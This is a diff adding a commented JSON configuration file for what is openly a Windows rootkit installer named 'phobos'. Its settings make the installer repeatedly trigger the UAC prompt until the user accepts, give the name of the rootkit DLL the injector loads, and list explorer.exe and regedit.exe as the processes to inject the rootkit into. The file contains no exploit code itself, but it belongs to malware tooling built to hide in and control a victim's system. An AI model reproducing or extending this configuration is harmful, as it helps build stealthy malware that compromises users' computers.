@@ -1,0 +1,19 @@
+{
+    // if the installer will continuously
+    // trigger the UAC prompt until it is
+    // accepted
+    "admin_mode": true,
+
+    // what the rootkit dll will be called
+    //
+    // if it is changed, the injector will
+    // not find it and just exit
+    "rootkit_name": "phobos",
+
+    // what processes the installer will
+    // inject the rootkit into
+    "injectable_procs": [
+        "explorer.exe",
+        "regedit.exe"
+    ]
+}
